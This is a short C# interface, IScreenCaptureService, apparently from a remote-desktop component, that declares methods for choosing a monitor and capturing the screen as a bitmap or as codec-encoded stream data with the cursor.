using System;
using System.Drawing;
using Orcus.Shared.Utilities.Compression;

namespace Orcus.Commands.RemoteDesktop.Capture
{
    public interface IScreenCaptureService : IDisposable
    {
        bool IsSupported { get; }
        void Initialize(int monitor);
        void ChangeMonitor(int monitor);
        RemoteDesktopDataInfo CaptureScreen(IStreamCodec streamCodec, ICursorStreamCodec cursorStreamCodec, bool updateCursor);
        Bitmap CaptureScreen();
    }
}